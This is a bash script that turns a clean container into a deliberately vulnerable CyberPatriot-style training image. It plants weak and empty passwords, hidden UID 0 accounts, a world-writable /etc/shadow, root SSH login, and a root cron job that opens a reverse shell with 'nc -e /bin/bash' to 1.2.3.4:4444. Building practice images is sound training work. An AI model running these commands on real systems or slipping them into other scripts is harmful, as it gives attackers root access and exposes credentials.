#!/usr/bin/env bash
# Turns a clean container into a small vulnerable "CyberPatriot image". Container use only.
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null
apt-get install -y -qq sudo passwd login john nmap vsftpd cups openssh-server cron pamtester procps iproute2 iptables >/dev/null 2>&1

mk() { useradd -m -s /bin/bash "$1"; echo "$1:$2" | chpasswd; }
mk santa   'Santa#2026pass';  usermod -aG sudo santa     # authorized admin
mk prancer 'Pr@ncer2026x';    usermod -aG sudo prancer   # authorized USER wrongly in sudo
mk hacker  'Hack3r#2026xx'                               # not in README
useradd -m -s /bin/bash dasher; passwd -d dasher >/dev/null   # authorized user, EMPTY password
useradd -o -u 0 -g 0 -M -s /bin/bash toor                     # hidden root account
useradd -o -u 0 -g 0 -m -d /home/blitzen -s /bin/bash blitzen      # README user secretly UID 0
# cupid is in the README but missing on the box
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf                    # loads AFTER sysctl.d
printf '\nMatch User sftponly\n    ForceCommand internal-sftp\n' >> /etc/ssh/sshd_config

chmod 666 /etc/shadow
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
mkdir -p /run/sshd
echo "net.ipv4.tcp_syncookies=0" > /etc/sysctl.d/10-bad.conf
echo '* * * * * root nc -e /bin/bash 1.2.3.4 4444' > /etc/cron.d/backdoor
mkdir -p /home/santa/Music && echo "not really music" > /home/santa/Music/song.mp3

cat > /tmp/cp-config.txt <<'EOF'
ADMINS=santa
USERS=prancer dasher cupid blitzen
CRITICAL_SERVICES=vsftpd ssh
ALLOWED_SOFTWARE=nmap
NEW_PASSWORD=Cyb3rP@triot!2026
EOF
echo "planted"
